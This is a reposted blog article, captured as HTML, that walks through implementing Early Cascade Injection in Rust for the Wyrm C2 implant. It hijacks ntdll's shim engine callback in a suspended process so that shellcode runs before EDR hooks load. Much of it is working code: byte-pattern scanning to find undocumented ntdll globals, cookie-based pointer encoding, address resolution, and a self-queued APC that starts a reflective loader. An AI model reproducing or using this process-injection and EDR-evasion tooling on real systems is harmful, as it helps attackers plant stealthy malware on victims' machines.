@@ -1,0 +1,605 @@
+# https://core-jmp.org/2026/03/crimes-against-ntdll-implementing-early-cascade-injection/
+
+<!DOCTYPE html><!--[if IE 9 ]>   <html class="no-js oldie ie9 ie" lang="en-US" > <![endif]--><!--[if (gt IE 9)|!(IE)]><!--><html class="js audio canvas fullscreen svg video cssanimations boxshadow csscolumns csscolumns-width csscolumns-span csscolumns-fill csscolumns-gap csscolumns-rule csscolumns-rulecolor csscolumns-rulestyle csscolumns-rulewidth csscolumns-breakbefore csscolumns-breakafter csscolumns-breakinside flexbox csscalc no-flexboxtweener cssgradients csstransforms supports csstransforms3d csstransitions objectfit object-fit cssclippathsvg cssclippathinset cssclippathcircle cssclippathellipse cssclippathpolygon" lang="en-US" style=""><!--<![endif]-->
+
+
+<body class="wp-singular post-template-default single single-post postid-1633 single-format-standard wp-custom-logo wp-theme-phlox phlox aux-boxed aux-resp aux-hd aux-page-animation-off aux-dom-ready" data-framed="">
+
+
+<div id="inner-body">
+
+    <!-- end header -->
+             <!-- end page header -->
+        
+    <main id="main" class="aux-main aux-territory  aux-single aux-boxed-container aux-content-top-margin right-sidebar aux-has-sidebar aux-sidebar-style-border aux-user-entry">
+        <div class="aux-wrapper">
+            <div class="aux-container aux-fold">
+
+                <div id="primary" class="aux-primary">
+                    <div class="content" role="main">
+
+                                                            <article class="aux-simple-context post-1633 post type-post status-publish format-standard has-post-thumbnail hentry category-attaks category-bypassing category-edr category-injection category-rust category-winapi-2 category-winapi category-windows tag-early-cascade-injection tag-edr-evasion tag-malware-development tag-ntdll-internals tag-offensive-security tag-process-injection tag-red-team-techniques tag-rust-programming tag-windows-internals tag-windows-loader">
+
+                                                                                        <div class="entry-media">
+                                                <div class="aux-media-frame aux-media-image aux-image-mask"><a href="https://core-jmp.org/2026/03/crimes-against-ntdll-implementing-early-cascade-injection/"><img width="300" height="288" src="https://core-jmp.org/wp-content/uploads/2026/03/%D0%A1%D0%BD%D0%B8%D0%BC%D0%BE%D0%BA-%D1%8D%D0%BA%D1%80%D0%B0%D0%BD%D0%B0-2026-03-14-%D0%B2-15.39.47-300x300.png" class="aux-attachment aux-featured-image attachment-300x288 aux-attachment-id-1634 " alt="Crimes against NTDLL - Implementing Early Cascade Injection" data-ratio="1" data-original-w="879"></a></div>                                            </div>
+                                                                                        <div class="entry-main">
+
+                                                
+
+                                                                                                <div class="entry-info ">
+                                                                                                        <div class="entry-date"><time datetime="2026-03-14T14:44:51+00:00">March 14, 2026</time></div>
+                                                                                                        <div class="entry-author">
+                                                        <span class="meta-sep">by</span>
+                                                        <span class="author vcard">
+                                                            <a href="https://core-jmp.org/author/oxfemale/" rel="author" title="View all posts by oxfemale">
+                                                                oxfemale                                                            </a>
+                                                        </span>
+                                                    </div>
+                                                                                                        <div class="entry-comments">
+                                                        <span class="meta-sep">with</span>
+                                                        <span class="meta-comment">no comment</span>
+                                                    </div>
+                                                                                                        <div class="entry-tax">
+                                                                                                                <a href="https://core-jmp.org/security/attaks/" title="View all posts in attaks" rel="category">attaks</a><a href="https://core-jmp.org/security/windows/bypassing/" title="View all posts in Bypassing" rel="category">Bypassing</a><a href="https://core-jmp.org/security/edr/" title="View all posts in EDR" rel="category">EDR</a><a href="https://core-jmp.org/security/windows/injection/" title="View all posts in Injection" rel="category">Injection</a><a href="https://core-jmp.org/security/rust/" title="View all posts in Rust" rel="category">Rust</a><a href="https://core-jmp.org/security/windows/winapi/" title="View all posts in winapi" rel="category">winapi</a><a href="https://core-jmp.org/security/winapi-2/" title="View all posts in winapi" rel="category">winapi</a><a href="https://core-jmp.org/security/windows/" title="View all posts in windows" rel="category">windows</a>                                                    </div>
+                                                                                                    </div>
+                                                
+                                                <div class="entry-content">
+                                                    <form method="get" action="https://core-jmp.org/wp-admin/admin-post.php" style="text-align:center; margin:10px 0;"><input type="image" src="https://core-jmp.org/wp-content/plugins/post-to-pdf-exporter/assets/image/pdf.png" alt="Download PDF" style="max-width:50px;"></form>
+<p><a href="https://fluxsec.red/implementing-early-cascade-injection-rust">Original text</a> by <a href="https://fluxsec.red/">fluxsec</a></p>
+
+
+
+<blockquote class="wp-block-quote has-text-align-center is-layout-flow wp-block-quote-is-layout-flow">
+<p class="has-text-align-center"><em>Early Cascade Injection is an advanced process injection technique designed to execute payloads at the earliest stage of Windows process initialization. The method abuses internal components of the Windows loader located in&nbsp;<strong>ntdll.dll</strong>, specifically the Application Compatibility Shim Engine. By modifying undocumented global variables such as&nbsp;<strong><code>g_ShimsEnabled</code></strong>&nbsp;and the callback pointer&nbsp;<strong><code>g_fnSE_DllLoaded</code></strong>, an attacker can redirect the loader’s DLL-load callback to attacker-controlled shellcode.</em></p>
+
+
+
+<p class="has-text-align-center"><em>The attack typically begins by creating a new process in a&nbsp;<strong>suspended state</strong>, injecting the payload into its memory, and patching these shim engine variables. When the process resumes, the Windows loader starts initializing modules and loading system libraries. Because the shim engine callback has been redirected, the injected shellcode executes as part of the legitimate loader workflow.</em></p>
+
+
+
+<p class="has-text-align-center"><em>This approach is particularly stealthy because it avoids common injection indicators such as&nbsp;<strong>CreateRemoteThread, APC injection, or thread context hijacking</strong>. Instead, the payload runs during normal loader activity, often&nbsp;<strong>before EDR user-mode hooks or monitoring components are initialized</strong>, making the technique significantly harder to detect.</em></p>
+</blockquote>
+
+
+
+<h2 class="wp-block-heading" id="intro">Intro</h2>
+
+
+
+<p>You can find this implementation in my&nbsp;<a href="https://github.com/0xflux/Wyrm/" target="_blank" rel="noreferrer noopener">Wyrm C2 framework on GitHub</a>.</p>
+
+
+
+<p>Early Cascade Injection was published by&nbsp;<a href="https://www.outflank.nl/blog/2024/10/15/introducing-early-cascade-injection-from-windows-process-creation-to-stealthy-injection/" target="_blank" rel="noreferrer noopener">Outflank</a>&nbsp;in 2024. Full credit goes to them for discovering the technique – this post deals with the<strong>implementation</strong>&nbsp;of Early Cascade Injection in&nbsp;<strong>Rust</strong>.</p>
+
+
+
+<p>I recommend reading Outflank’s blog post – however, as a quick primer, the technique allows for the&nbsp;<strong>loading of fileless malware</strong>&nbsp;in a foreign process without having to perform typical (and heavily monitored) process injection. This is also useful as a primitive to spawn a new sacrificial process for doing things such as&nbsp;<strong>execute-assembly</strong>&nbsp;in the Cobalt Strike world (Wyrm does not implement this yet with a sacrificial process but uses the&nbsp;<strong>dotex</strong>&nbsp;command to run dotnet code in memory).</p>
+
+
+
+<p>There are two general buckets for running shellcode in foreign processes (exploits aside):</p>
+
+
+
+<ol class="wp-block-list">
+<li>Process injection where the process is already running, or;</li>
+
+
+
+<li>Spawn and inject, such as Process Hollowing, Early Bird Injection etc.</li>
+</ol>
+
+
+
+<p>The problem with these attack surfaces, is they are very well documented and as such, likely to be detected by EDRs.</p>
+
+
+
+<p>The clever trick about Early Cascade Injection, is it allows us to have code execution on our shellcode bootstrap&nbsp;<strong>without creating a suspicious thread</strong>, or using&nbsp;<strong>suspicious cross process Asynchronous Procedure Calls</strong>&nbsp;(APC). Instead, we create the process in a suspended state (as is the norm with early process injection techniques), and we surgically tamper with NTDLL before the first usermode thread runs.</p>
+
+
+
+<p>When a new process is started, the Windows kernel performs certain actions in order to set up a process, one of those, is mapping NTDLL into memory. Importantly, after the kernel has finished setting up the scaffolding of the process, the thread will then switch into usermode and begin through&nbsp;<strong>ntdll!LdrInitializeThunk</strong>. As Outflank explains, creating a process in a suspended state with the&nbsp;<strong>CREATE_SUSPENDED</strong>&nbsp;flag, the usermode thread will not run until that thread is resumed.</p>
+
+
+
+<h2 class="wp-block-heading" id="the-shim-engine">The Shim Engine</h2>
+
+
+
+<p>I am purposefully missing out a lot of detail around how Outflank arrived here – their&nbsp;<a href="https://www.outflank.nl/blog/2024/10/15/introducing-early-cascade-injection-from-windows-process-creation-to-stealthy-injection/" target="_blank" rel="noreferrer noopener">blog post</a>&nbsp;does an excellent job of talking about the&nbsp;<strong>internals of NTDLL</strong>&nbsp;and&nbsp;<strong>EDR Preloading</strong>.</p>
+
+
+
+<p>However, the&nbsp;<a href="https://techcommunity.microsoft.com/blog/askperf/demystifying-shims---or---using-the-app-compat-toolkit-to-make-your-old-stuff-wo/374947" target="_blank" rel="noreferrer noopener">Shim Engine</a>&nbsp;is a technology implemented in NTDLL which is designed as a compatibility framework intercepting API calls from older applications modifying them to work on newer versions of Windows. The machinery of the engine is implemented in NTDLL, and it is that machinery which Outflank discovered can be abused for process injection.</p>
+
+
+
+<p>A global variable internal to NTDLL was discovered called&nbsp;<strong>g_pfnSE_DllLoaded</strong>, which is part of the Shim Engine, is a pointer which can be modified by us to point to attacker controlled shellcode. To use this variable, we need to enable a flag named&nbsp;<strong>g_ShimsEnabled</strong>, which instructs the thread to start performing the Shim Engine routines.</p>
+
+
+
+<p>Modifying these two gives us shellcode execution, however, we don’t want the full machinery of the Shim Engine to start running. Outflank chose this variable (<strong>g_pfnSE_DllLoaded</strong>) to abuse as it is the first in a series of pointers that gets dispatched; meaning as soon as we begin executing our stub, we must disable&nbsp;<strong>g_ShimsEnabled</strong>&nbsp;so that the rest of the Shim Engine doesn’t run.</p>
+
+
+
+<p>Finally, in the shellcode stub which runs, we can queue up an APC in the&nbsp;<strong>current thread</strong>&nbsp;which is not nearly as suspicious as cross-process APCs. If you want some info on abusing cross-process APCs, check my blog post on&nbsp;<a href="https://fluxsec.red/apc-queue-injection-rust" target="_blank" rel="noreferrer noopener">APC Queue Injection</a>.</p>
+
+
+
+<p>So, the elements we need to make this work are:</p>
+
+
+
+<ol class="wp-block-list">
+<li><strong>Stage 0</strong>&nbsp;– Initiator process (a loader, existing implant, etc) which creates the suspended process.</li>
+
+
+
+<li><strong>Stage 1</strong>&nbsp;– Shim engine bootstrap shellcode that gets injected into the suspended process.</li>
+
+
+
+<li><strong>Stage 2</strong>&nbsp;– A post-exploitation payload (such as the Wyrm C2 framework).</li>
+</ol>
+
+
+
+<p>For the&nbsp;<strong>stage 2</strong>&nbsp;payload, it must be capable of performing&nbsp;<strong>Reflective DLL Injection</strong>&nbsp;at the start address of the queued APC, or your&nbsp;<strong>stage 1</strong>&nbsp;stub needs to set up the post-ex payload.</p>
+
+
+
+<p>There is one complication to solve – the variables we need to modify are not exported in any way that we could link against them or somehow call them via FFI. So, how do we manipulate them? Well, the approach I took was simple pattern matching of code which uses these pointers, and then taking the address of the variable in memory. For example, the below byte patterns represent the machine code, and the comments represent the instructions:</p>
+
+
+
+<pre class="wp-block-code has-small-font-size"><code class="hljs java"><span class="hljs-keyword">const</span> G_PFNSE_DLLLOADED_PATTERN: &amp;[u8] = &amp;[
+    <span class="hljs-number">0x48</span>, <span class="hljs-number">0x8b</span>, <span class="hljs-number">0x3d</span>, <span class="hljs-number">0xd0</span>, <span class="hljs-number">0xc3</span>, <span class="hljs-number">0x12</span>, <span class="hljs-number">0x00</span>,   <span class="hljs-comment">// mov  rdi, qword ptr [ntdll!g_pfnSE_DllLoaded (############)]</span>
+    <span class="hljs-number">0x83</span>, <span class="hljs-number">0xe0</span>, <span class="hljs-number">0x3f</span>,                           <span class="hljs-comment">// and  eax, 3Fh</span>
+    <span class="hljs-number">0x44</span>, <span class="hljs-number">0x2b</span>, <span class="hljs-number">0xe0</span>,                           <span class="hljs-comment">// sub  r12d, eax</span>
+    <span class="hljs-number">0x8b</span>, <span class="hljs-number">0xc2</span>,                                 <span class="hljs-comment">// mov  eax, edx</span>
+    <span class="hljs-number">0x41</span>, <span class="hljs-number">0x8a</span>, <span class="hljs-number">0xcc</span>                            <span class="hljs-comment">// mov  cl, r12b</span>
+];
+
+<span class="hljs-keyword">const</span> G_SHIMS_ENABLED_PATTERN: &amp;[u8] = &amp;[
+    <span class="hljs-number">0xe8</span>, <span class="hljs-number">0x33</span>, <span class="hljs-number">0x38</span>, <span class="hljs-number">0xf5</span>, <span class="hljs-number">0xff</span>,               <span class="hljs-comment">// call ntdll!RtlEnterCriticalSection (7ff9ddead780)</span>
+    <span class="hljs-number">0x44</span>, <span class="hljs-number">0x38</span>, <span class="hljs-number">0x2d</span>, <span class="hljs-number">0xe4</span>, <span class="hljs-number">0x84</span>, <span class="hljs-number">0x11</span>, <span class="hljs-number">0x00</span>,   <span class="hljs-comment">// cmp  byte ptr [ntdll!g_ShimsEnabled (7ff9de072438)], r13b</span>
+    <span class="hljs-number">0x48</span>, <span class="hljs-number">0x8d</span>, <span class="hljs-number">0x35</span>, <span class="hljs-number">0x95</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0x11</span>, <span class="hljs-number">0x00</span>,   <span class="hljs-comment">// lea  rsi, [ntdll!PebLdr+0x10 (7ff9de0728f0)]</span>
+];</code></pre>
+
+
+
+<p>Then, using a simple function, we can scan the NTDLL module for these patterns. This is somewhat brittle as these bytes could change between builds of NTDLL. A better approach could be to wildcard the offset bytes and search pattern match on the instructions around that which likely have a better chance at being consistent between patches.</p>
+
+
+
+<h2 class="wp-block-heading" id="implementation">Implementation</h2>
+
+
+
+<h3 class="wp-block-heading" id="stage-zero">Stage zero</h3>
+
+
+
+<p>Ok – lets start with the&nbsp;<strong>stage zero</strong>&nbsp;payload which is the ‘initiator’. This has a few jobs:</p>
+
+
+
+<ol class="wp-block-list">
+<li>Create a process in the suspended state.</li>
+
+
+
+<li>Inject the&nbsp;<strong>stage two</strong>&nbsp;post-ex payload (in this case,&nbsp;<strong>Wyrm</strong>).</li>
+
+
+
+<li>Position the address of the&nbsp;<strong>stage one</strong>&nbsp;shellcode (which in this case, is included in the injected memory from step 2).</li>
+
+
+
+<li>Encode the pointer to the shellcode with the cookie found in:&nbsp;<strong>SharedUserData!Cookie</strong>&nbsp;found at the constant address&nbsp;<strong>0x7FFE0330</strong>.</li>
+
+
+
+<li>Write the 2 pointers in the NTDLL Shim Engine.</li>
+
+
+
+<li>Resume the thread.</li>
+</ol>
+
+
+
+<p>There is very little point in me just doing a copy-paste of the code to implement this, you can see it in the function&nbsp;<strong>early_cascade_spawn_child</strong>&nbsp;in the Wyrm source:&nbsp;<a href="https://github.com/0xflux/Wyrm/blob/master/implant/src/spawn_inject/early_cascade.rs" target="_blank" rel="noreferrer noopener">src/spawn_inject/early_cascade.rs</a>. However, I will call out a few important things:</p>
+
+
+
+<p>On step 3, I did not write separate shellcode for the bootstrap. Instead, I wrote the bootstrap in&nbsp;<strong>no_std</strong>&nbsp;Rust meaning it does not rely on the standard library. The result is code that is&nbsp;<em>sufficiently</em>&nbsp;position independent to place in memory and execute directly, effectively behaving like shellcode. This is incredibly ergonomic.</p>
+
+
+
+<p>In Wyrm I provide a function called&nbsp;<strong>Shim</strong>&nbsp;which acts as this ‘shellcode bootstrap’ for using Early Cascade Injection, and we will take a look at that code in the&nbsp;<strong>Stage One</strong>&nbsp;section. So, the address we will put into&nbsp;<strong>g_pfnSE_DllLoaded</strong>, is the address of the Shim function – allowing the thread to start executing straight up machine code with no dependencies.&nbsp;<strong>Neat!</strong></p>
+
+
+
+<p>The&nbsp;<strong>next thing</strong>&nbsp;to talk about here is having to encode our pointer that we write to&nbsp;<strong>g_pfnSE_DllLoaded</strong>. The shim callback pointer is stored in an encoded form, so writing a raw function pointer into&nbsp;<strong>g_pfnSE_DllLoaded</strong>&nbsp;will not work. Luckily for us, the key (cookie) used for the encryption is found in&nbsp;<strong>SharedUserData!Cookie</strong>, which is at a constant address (64-bit) of&nbsp;<strong>0x7FFE0330</strong>. So, we can write a function that performs the pointer encryption, returning the encrypted copy of the pointer:</p>
+
+
+
+<pre class="wp-block-code has-small-font-size"><code class="hljs cs"><span class="hljs-function">fn <span class="hljs-title">encode_system_ptr</span>(<span class="hljs-params">ptr: *<span class="hljs-keyword">const</span> c_void</span>) -&gt; *<span class="hljs-keyword">const</span> c_void </span>{
+    <span class="hljs-comment">// get pointer cookie from SharedUserData!Cookie (0x330)</span>
+    <span class="hljs-keyword">let</span> cookie = <span class="hljs-keyword">unsafe</span> { *(<span class="hljs-number">0x7FFE0330</span> <span class="hljs-keyword">as</span> *<span class="hljs-keyword">const</span> u32) };
+
+    <span class="hljs-comment">// rotr64</span>
+    <span class="hljs-keyword">let</span> ptr_val = ptr <span class="hljs-keyword">as</span> usize;
+    <span class="hljs-keyword">let</span> xored = cookie <span class="hljs-keyword">as</span> usize ^ ptr_val;
+    <span class="hljs-keyword">let</span> rotated = xored.rotate_right((cookie &amp; <span class="hljs-number">0x3F</span>) <span class="hljs-keyword">as</span> u32);
+
+    rotated <span class="hljs-keyword">as</span> *<span class="hljs-keyword">const</span> c_void
+}</code></pre>
+
+
+
+<p><strong>Finally</strong>, we want to talk about how to resolve the global variables we wish to write to. As stipulated we are going to pattern match usage of the pointers in NTDLL, to discover their true address based on the offset of where we found it.</p>
+
+
+
+<p>To follow through in its entirety, check the source in&nbsp;<a href="https://github.com/0xflux/Wyrm/blob/master/shared_no_std/src/memory.rs" target="_blank" rel="noreferrer noopener">shared_no_std/src/memory.rs</a>.</p>
+
+
+
+<p>So, we take the two patterns:</p>
+
+
+
+<pre class="wp-block-code has-small-font-size"><code class="hljs java"><span class="hljs-keyword">const</span> G_PFNSE_DLLLOADED_PATTERN: &amp;[u8] = &amp;[
+    <span class="hljs-number">0x48</span>, <span class="hljs-number">0x8b</span>, <span class="hljs-number">0x3d</span>, <span class="hljs-number">0xd0</span>, <span class="hljs-number">0xc3</span>, <span class="hljs-number">0x12</span>, <span class="hljs-number">0x00</span>,   <span class="hljs-comment">// mov  rdi, qword ptr [ntdll!g_pfnSE_DllLoaded (############)]</span>
+    <span class="hljs-number">0x83</span>, <span class="hljs-number">0xe0</span>, <span class="hljs-number">0x3f</span>,                           <span class="hljs-comment">// and  eax, 3Fh</span>
+    <span class="hljs-number">0x44</span>, <span class="hljs-number">0x2b</span>, <span class="hljs-number">0xe0</span>,                           <span class="hljs-comment">// sub  r12d, eax</span>
+    <span class="hljs-number">0x8b</span>, <span class="hljs-number">0xc2</span>,                                 <span class="hljs-comment">// mov  eax, edx</span>
+    <span class="hljs-number">0x41</span>, <span class="hljs-number">0x8a</span>, <span class="hljs-number">0xcc</span>                            <span class="hljs-comment">// mov  cl, r12b</span>
+];
+
+<span class="hljs-keyword">const</span> G_SHIMS_ENABLED_PATTERN: &amp;[u8] = &amp;[
+    <span class="hljs-number">0xe8</span>, <span class="hljs-number">0x33</span>, <span class="hljs-number">0x38</span>, <span class="hljs-number">0xf5</span>, <span class="hljs-number">0xff</span>,               <span class="hljs-comment">// call ntdll!RtlEnterCriticalSection (7ff9ddead780)</span>
+    <span class="hljs-number">0x44</span>, <span class="hljs-number">0x38</span>, <span class="hljs-number">0x2d</span>, <span class="hljs-number">0xe4</span>, <span class="hljs-number">0x84</span>, <span class="hljs-number">0x11</span>, <span class="hljs-number">0x00</span>,   <span class="hljs-comment">// cmp  byte ptr [ntdll!g_ShimsEnabled (7ff9de072438)], r13b</span>
+    <span class="hljs-number">0x48</span>, <span class="hljs-number">0x8d</span>, <span class="hljs-number">0x35</span>, <span class="hljs-number">0x95</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0x11</span>, <span class="hljs-number">0x00</span>,   <span class="hljs-comment">// lea  rsi, [ntdll!PebLdr+0x10 (7ff9de0728f0)]</span>
+];</code></pre>
+
+
+
+<p>And we search for their usage with this simple function where we pass the pattern as the third argument. The first and second args relate to the base address of NTDLL and its size:</p>
+
+
+
+<pre class="wp-block-code has-small-font-size"><code class="hljs cs"><span class="hljs-meta">#[inline(always)]</span>
+<span class="hljs-function">pub fn <span class="hljs-title">scan_module_for_byte_pattern</span>(<span class="hljs-params">
+    image_base: *<span class="hljs-keyword">const</span> c_void,
+    image_size: usize,
+    pattern: &amp;[u8],
+</span>) -&gt; Result&lt;*<span class="hljs-keyword">const</span> c_void, (<span class="hljs-params"></span>)&gt; </span>{
+    <span class="hljs-comment">// Convert the raw address pointer to a byte pointer so we can read individual bytes</span>
+    <span class="hljs-keyword">let</span> image_base = image_base <span class="hljs-keyword">as</span> *<span class="hljs-keyword">const</span> u8;
+    <span class="hljs-keyword">let</span> mut cursor = image_base <span class="hljs-keyword">as</span> *<span class="hljs-keyword">const</span> u8;
+    <span class="hljs-comment">// End of image denotes the end of our reads, if nothing is found by that point we have not found the</span>
+    <span class="hljs-comment">// sequence of bytes</span>
+    <span class="hljs-keyword">let</span> end_of_image = <span class="hljs-keyword">unsafe</span> { image_base.add(image_size) };
+
+    <span class="hljs-keyword">while</span> cursor != end_of_image {
+        <span class="hljs-keyword">unsafe</span> {
+            <span class="hljs-keyword">let</span> bytes = from_raw_parts(cursor, pattern.len());
+
+            <span class="hljs-keyword">if</span> bytes == pattern {
+                <span class="hljs-keyword">return</span> Ok(cursor <span class="hljs-keyword">as</span> *<span class="hljs-keyword">const</span> _);
+            }
+
+            cursor = cursor.add(<span class="hljs-number">1</span>);
+        }
+    }
+
+    Err(())
+}</code></pre>
+
+
+
+<p>Then, we need to calculate the difference between the address where we found the start of the machine code, and the offset in the machine code which is where the variable lives:</p>
+
+
+
+<pre class="wp-block-code has-small-font-size"><code class="hljs cs"><span class="hljs-keyword">let</span> p_g_pfnse_dll_loaded = <span class="hljs-keyword">unsafe</span> {
+    <span class="hljs-keyword">const</span> INSTRUCTION_LEN: isize = <span class="hljs-number">7</span>;
+
+    <span class="hljs-comment">// Offset by 3 bytes to get the imm, and read the imm as a 4 byte value</span>
+    <span class="hljs-keyword">let</span> offset = read_unaligned((p_text_g_pfnse_dll_loaded <span class="hljs-keyword">as</span> *<span class="hljs-keyword">const</span> u8).add(<span class="hljs-number">3</span>) <span class="hljs-keyword">as</span> *<span class="hljs-keyword">const</span> i32);
+    <span class="hljs-keyword">let</span> offset = offset <span class="hljs-keyword">as</span> isize + INSTRUCTION_LEN;
+
+    (p_text_g_pfnse_dll_loaded <span class="hljs-keyword">as</span> isize + offset) <span class="hljs-keyword">as</span> *mut c_void
+};</code></pre>
+
+
+
+<p>And with that, we can resolve both internal variables addresses! All that is left to do is set&nbsp;<strong>g_pfnse_dll_loaded</strong>&nbsp;to the encrypted address we dealt with earlier, and set&nbsp;<strong>g_ShimsEnabled</strong>&nbsp;to&nbsp;<strong>1</strong>.</p>
+
+
+
+<h3 class="wp-block-heading" id="stage-one">Stage one</h3>
+
+
+
+<p>The&nbsp;<strong>stage one</strong>&nbsp;that is capable of being executed by a fresh thread is found in the&nbsp;<strong>Shim</strong>&nbsp;function in&nbsp;<a href="https://github.com/0xflux/Wyrm/blob/master/implant/src/stubs/shim.rs" target="_blank" rel="noreferrer noopener">implant/src/stubs/shim.rs</a>.</p>
+
+
+
+<p>Whilst operating here we do have some restrictions – we should also assume&nbsp;<strong>kernel32</strong>&nbsp;and&nbsp;<strong>kernelbase</strong>&nbsp;are not available for use, meaning we are limited to the core library, compiler intrinsics and functions exported in NTDLL. This is fine, we can work with this for what we need.</p>
+
+
+
+<p>The stage one has a few duties:</p>
+
+
+
+<ol class="wp-block-list">
+<li>Resolve the address of&nbsp;<strong>NtQueueApcThread</strong>&nbsp;so we can launch the&nbsp;<strong>stage two</strong>.</li>
+
+
+
+<li>Disable the&nbsp;<strong>g_ShimsEnabled</strong>&nbsp;variable we enabled from stage zero.</li>
+
+
+
+<li>Queue an APC via&nbsp;<strong>NtQueueApcThread</strong>&nbsp;pointing to the&nbsp;<strong>stage two</strong>.</li>
+</ol>
+
+
+
+<p>To resolve the address of&nbsp;<strong>NtQueueApcThread</strong>, I use a variation of my&nbsp;<a href="https://fluxsec.red/export-resolver" target="_blank" rel="noreferrer noopener">export-resolver</a>&nbsp;crate which I have embedded into Wyrm. In short, this uses&nbsp;<a href="https://fareedfauzi.github.io/2024/07/13/PEB-Walk.html" target="_blank" rel="noreferrer noopener">PEB walking</a>to resolve the addresses of functions we wish to use. The variation included in Wyrm is&nbsp;<strong>no_std</strong>&nbsp;compliant such that we can use it in our free standing stub.</p>
+
+
+
+<p>Next, we search for&nbsp;<strong>g_ShimsEnabled</strong>&nbsp;and set it to 0, in exactly the same way shown above. Again – the code I wrote to resolve the addresses is&nbsp;<strong>no_std</strong>.</p>
+
+
+
+<p>Finally, we can call&nbsp;<strong>NtQueueApcThread</strong>&nbsp;to queue an APC at the address of the reflective loader of Wyrm.</p>
+
+
+
+<p>In order to use this function, we first must declare its prototype:</p>
+
+
+
+<pre class="wp-block-code has-small-font-size"><code class="hljs cs">type NtQueueApcThread = <span class="hljs-keyword">unsafe</span> <span class="hljs-keyword">extern</span> <span class="hljs-string">"system"</span> fn(
+    thread_handle: isize,
+    apc_routine: *<span class="hljs-keyword">const</span> c_void,
+    arg1: usize,
+    arg2: usize,
+    arg3: usize,
+) -&gt; u32;</code></pre>
+
+
+
+<p>And then cast the address we found via the&nbsp;<strong>export-resolver</strong>&nbsp;variant to the type&nbsp;<code>NtQueueApcThread</code>:</p>
+
+
+
+<pre class="wp-block-code has-small-font-size"><code class="hljs ruby">let p_nt_queue_apc_thread = resolve_address(<span class="hljs-string">"ntdll.dll"</span>, <span class="hljs-string">"NtQueueApcThread"</span>, None);
+let NtQueueApcThread = core::mem::transmute::&lt;<span class="hljs-number">_</span>, NtQueueApcThread&gt;(p_nt_queue_apc_thread);</code></pre>
+
+
+
+<p>Then we set up our arguments which go into the function, and call it normally (where&nbsp;<strong>Load</strong>&nbsp;is the name of the function in Wyrm which performs reflective DLL loading):</p>
+
+
+
+<pre class="wp-block-code has-small-font-size"><code class="hljs cs"><span class="hljs-keyword">let</span> current_thread = <span class="hljs-number">-2</span>isize;
+<span class="hljs-keyword">let</span> apc_routine = Load <span class="hljs-keyword">as</span> *<span class="hljs-keyword">const</span> c_void;
+<span class="hljs-keyword">let</span> apc_arg1 = <span class="hljs-number">0</span>usize;
+<span class="hljs-keyword">let</span> apc_arg2 = <span class="hljs-number">0</span>usize;
+<span class="hljs-keyword">let</span> apc_arg3 = <span class="hljs-number">0</span>usize;
+
+NtQueueApcThread(current_thread, apc_routine, apc_arg1, apc_arg2, apc_arg3);</code></pre>
+
+
+
+<p>The eagle-eyed reader may be wondering how the queued APC is actually run – well, helpfully, when the thread starts executing in NTDLL, after our shim magic has run, NTDLL makes a call to&nbsp;<strong>NtTestAlert</strong>&nbsp;which causes any queued items in the APC queue to dispatch, giving us free execution without having to either wait on a prayer, or call NtTestAlert ourselves.</p>
+
+
+
+<h3 class="wp-block-heading" id="stage-two">Stage two</h3>
+
+
+
+<p>Finally, our stage two loads – in this case it’s the Wyrm reflective DLL loader. I’m not going into the internals of that here as it’s pretty complex, however you can check the source at:&nbsp;<a href="https://github.com/0xflux/Wyrm/blob/master/implant/src/stubs/rdi.rs" target="_blank" rel="noreferrer noopener">implant/src/stubs/rdi.rs</a>.</p>
+
+
+
+<h2 class="wp-block-heading" id="references">References</h2>
+
+
+
+<ul class="wp-block-list">
+<li><a href="https://www.outflank.nl/blog/2024/10/15/introducing-early-cascade-injection-from-windows-process-creation-to-stealthy-injection/" target="_blank" rel="noreferrer noopener">https://www.outflank.nl/blog/2024/10/15/introducing-early-cascade-injection-from-windows-process-creation-to-stealthy-injection/</a></li>
+
+
+
+<li><a href="https://ntdoc.m417z.com/ntqueueapcthread" target="_blank" rel="noreferrer noopener">https://ntdoc.m417z.com/ntqueueapcthread</a></li>
+
+
+
+<li><a href="https://github.com/0xNinjaCyclone/EarlyCascade/blob/main/main.c#L82" target="_blank" rel="noreferrer noopener">https://github.com/0xNinjaCyclone/EarlyCascade/blob/main/main.c#L82</a></li>
+
+
+
+<li><a href="https://malwaretech.com/2024/02/bypassing-edrs-with-edr-preload.html" target="_blank" rel="noreferrer noopener">https://malwaretech.com/2024/02/bypassing-edrs-with-edr-preload.html</a></li>
+</ul>
+<div class="sharedaddy sd-sharing-enabled"><div class="robots-nocontent sd-block sd-social sd-social-icon-text sd-sharing"><h3 class="sd-title">Share this:</h3><div class="sd-content"><ul data-sharing-events-added="true"><li class="share-facebook"><a rel="nofollow noopener noreferrer" data-shared="sharing-facebook-1633" class="share-facebook sd-button share-icon" href="https://core-jmp.org/2026/03/crimes-against-ntdll-implementing-early-cascade-injection/?share=facebook&amp;nb=1" target="_blank" aria-labelledby="sharing-facebook-1633">
+				<span id="sharing-facebook-1633">Share on Facebook (Opens in new window)</span>
+				<span>Facebook</span>
+			</a></li><li class="share-x"><a rel="nofollow noopener noreferrer" data-shared="sharing-x-1633" class="share-x sd-button share-icon" href="https://core-jmp.org/2026/03/crimes-against-ntdll-implementing-early-cascade-injection/?share=x&amp;nb=1" target="_blank" aria-labelledby="sharing-x-1633">
+				<span id="sharing-x-1633">Share on X (Opens in new window)</span>
+				<span>X</span>
+			</a></li><li class="share-end"></li></ul></div></div></div><div class="sharedaddy sd-block sd-like jetpack-likes-widget-wrapper jetpack-likes-widget-unloaded" id="like-post-wrapper-252212136-1633-69edebb15e342" data-src="https://widgets.wp.com/likes/?ver=15.7.1#blog_id=252212136&amp;post_id=1633&amp;origin=core-jmp.org&amp;obj_id=252212136-1633-69edebb15e342" data-name="like-post-frame-252212136-1633-69edebb15e342" data-title="Like or Reblog"><h3 class="sd-title">Like this:</h3><div class="likes-widget-placeholder post-likes-widget-placeholder" style="height: 55px;"><span class="button"><span>Like</span></span> <span class="loading">Loading...</span></div><span class="sd-text-color"></span><a class="sd-link-color"></a></div><div class="clear"></div>                                                </div>
+
+                                                                                                
+                                                                                            </div>
+
+
+                                            
+    
+
+
+                                            
+                                       </article>
+
+
+<!-- You can start editing here. -->
+
+
+        <!-- If comments are closed. -->
+    <p class="nocomments">Comments are closed.</p>
+
+    
+
+
+
+                    </div><!-- end content -->
+                </div><!-- end primary -->
+
+
+                
+            <!-- end primary siderbar -->
+
+
+            </div><!-- end container -->
+        </div><!-- end wrapper -->
+    </main><!-- end main -->
+
+    <!-- end sitefooter -->
+
+</div><!--! end of #inner-body -->
+
